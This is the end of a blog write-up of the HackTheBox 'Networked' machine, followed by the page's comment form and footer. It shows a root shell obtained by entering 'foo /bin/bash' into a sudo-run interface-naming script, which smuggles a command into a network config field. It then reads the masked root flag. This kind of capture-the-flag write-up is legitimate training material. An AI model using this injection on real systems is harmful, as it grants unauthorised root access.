<span class="go">test</span>
<span class="go">interface BROWSER_ONLY:</span>
<span class="go">test</span>
<span class="go">interface BOOTPROTO:</span>
<span class="go">test</span>
<span class="go">uid=0(root) gid=0(root) groups=0(root)</span>
<span class="go">uid=0(root) gid=0(root) groups=0(root)</span>
<span class="go">ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.</span>
<span class="gp">[guly@networked ~]$</span>
</pre></div>


<p>It works! Similarly we can get a shell very easily:</p>
<div class="highlight"><pre><span></span><span class="gp">[guly@networked ~]$</span> sudo /usr/local/sbin/changename.sh
<span class="go">interface NAME:</span>
<span class="go">foo /bin/bash</span>
<span class="go">interface PROXY_METHOD:</span>
<span class="go">test</span>
<span class="go">interface BROWSER_ONLY:</span>
<span class="go">test</span>
<span class="go">interface BOOTPROTO:</span>
<span class="go">test</span>
<span class="gp">[root@networked network-scripts]#</span> cat /root/root.txt 
<span class="go">0a****************************82</span>
</pre></div>


<p>As per the discussions in the Red Hat link I mentioned above they say "Just so that it's absolutely clear: This is <em>not</em> a security issue.".</p>
<p>In fact, this was possible only because the user <code>guly</code> could run the script as <code>root</code> which in turn allowed us to leverage this "weakness". </p>
			<style>
#pcs-comment-form input,
#pcs-comment-form textarea {
	width: 100%;
}
#pcs-comment-form-display-replyto {
	border: solid 1px black;
	padding: 2px;
}
#pcs-comment-form-display-replyto p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}
#pcs-comments ul {
	list-style: none;
}
#pcs-comments .comment-left {
	display: table-cell;
	padding-right: 10px;
}
#pcs-comments .comment-body {
	display: table-cell;
	vertical-align: top;
	width: 100%;
}
</style>

	<section id="pcs-comments">
	<header>
		<h2>Comments</h2>
		<hr/>
	</header>
		<p>There are no comments yet.</p>
	<section>
	<form id="pcs-comment-form" action="#">
		<legend>Add a Comment</legend>
		<input type="hidden" id="pcs-comment-form-input-replyto">
		<fieldset>
			<label for="pcs-comment-form-input-name">Name</label>
			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
		</fieldset>
		<fieldset>
			<label for="pcs-comment-form-input-website">Website</label>
			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
		</fieldset>
		<fieldset>
			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
		</fieldset>

		<button type="submit"
				id="pcs-comment-form-button-submit"
				>Post via email</button>

			<a href="https://sittingducks.io/feeds/comment.Networked.atom.xml">
				Comment Atom Feed
			</a>
	</form>
</section>

</section>

			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
	<script type="text/javascript">
		$(document).ready(function() {
			CommentSystem.email_user   = "sittingducks.io";
			CommentSystem.email_domain = "protonmail.com";
			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
				return ''
					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
					+ 	'Ã—'
					+ '</button>'
					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
			};

			$('#pcs-comment-form').on("submit",
				function( event )
				{
					event.preventDefault();
					$(location).attr('href', CommentSystem.getMailtoLink("Networked"));
				}
			);
		});
	</script>


      </div><!-- .entry-content -->
      <br /><br />
      <div class="article_meta">
        Tags:
          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
    </div>
  </div>
</article><!-- #post-## -->
                </div>
              </div><!-- #main -->
          </div><!-- #primary -->
        </div>
      </div><!-- close .row -->
    </div><!-- close .container -->
  </div><!-- close .site-content -->




  <div id="footer-area">
    <footer id="colophon" class="site-footer" role="contentinfo">
      <div class="site-info container">
        <div class="row">
                    <div class="copyright col-md-12">
                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
        </div>
      </div><!-- .site-info -->
      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
    </footer><!-- #colophon -->
  </div>

  <script type="text/javascript">
    window.addEventListener('load', function(){
    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
      window.scroll(0, document.getElementById('main').offsetTop);
    }})
  </script>

  
 <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
	<!-- Make sure jquery is loaded first, then load colorbox -->
  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>


  
  
</body>
</html>